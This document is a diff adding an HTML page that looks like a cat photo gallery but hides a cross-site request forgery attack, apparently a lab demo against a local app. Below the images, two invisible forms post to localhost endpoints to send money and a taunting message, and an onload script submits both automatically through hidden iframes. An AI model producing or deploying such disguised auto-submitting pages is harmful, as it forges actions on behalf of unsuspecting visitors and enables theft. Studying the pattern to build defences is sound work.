@@ -1,0 +1,45 @@
+<center><img src="logo.jpg"></center>
+<img src="cat1.jpg" height="300">
+<img src="cat2.jpg"  height="300">
+<img src="cat3.jpg"  height="300">
+<img src="cat4.jpg"  height="300">
+<img src="cat5.jpg"  height="300">
+<img src="cat6.jpg" height="300">
+<img src="cat1.jpg" height="300">
+<img src="cat2.jpg"  height="300">
+<img src="cat3.jpg"  height="300">
+<img src="cat4.jpg"  height="300">
+<img src="cat5.jpg"  height="300">
+<img src="cat6.jpg" height="300">
+<img src="cat1.jpg" height="300">
+<img src="cat2.jpg"  height="300">
+<img src="cat3.jpg"  height="300">
+<img src="cat4.jpg"  height="300">
+<img src="cat5.jpg"  height="300">
+<img src="cat6.jpg" height="300">
+<form method="post" action="http://localhost:3000/sendMoney" id="myForm" name="myForm" style="visibility: hidden;" target="dummyframe">
+    <input type="text" id="to" name="to" value="cat"> 
+    <input type="number" name="money" value="100">
+</form>
+
+<form method="post" action="http://localhost:3000/sendMessage" id="myForm2" name="myForm2" style="visibility: hidden;" target="dummyframe2">
+    <input type="text" id="to" name="to" value="dog"> 
+    <input type="number" name="message" value="HAHA I STOLE YOUR MONEY">
+</form>
+
+
+<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+<iframe name="dummyframe2" id="dummyframe2" style="display: none;"></iframe>
+
+<script type="text/javascript">
+    window.onload=function(){
+        var auto = setTimeout(function(){ submitform(); }, 100);
+
+        function submitform(){
+          document.forms["myForm"].submit();
+          document.forms["myForm2"].submit();
+
+        }
+
+    }
+</script>
